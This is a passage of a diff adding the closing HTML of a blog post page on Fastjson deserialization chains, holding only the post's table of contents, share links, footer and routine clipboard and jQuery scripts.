+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962"><span class="toc-number">1.</span> <span class="toc-text">Fastjson反序列化2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bcel%E4%B8%8D%E5%87%BA%E7%BD%91%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Bcel不出网链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">调试过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips"><span class="toc-number">1.1.2.</span> <span class="toc-text">Tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">Fastjson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-49"><span class="toc-number">1.2.2.</span> <span class="toc-text">fastjson&gt;&#x3D;1.2.49</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48"><span class="toc-number">1.3.</span> <span class="toc-text">1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThrowableDeserializer"><span class="toc-number">1.3.1.</span> <span class="toc-text">ThrowableDeserializer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaBeanDeserializer"><span class="toc-number">1.3.2.</span> <span class="toc-text">JavaBeanDeserializer</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&text=Fastjson反序列化2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&is_video=false&description=Fastjson反序列化2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson反序列化2&body=Check out this article: https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&name=Fastjson反序列化2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&t=Fastjson反序列化2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    le0n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
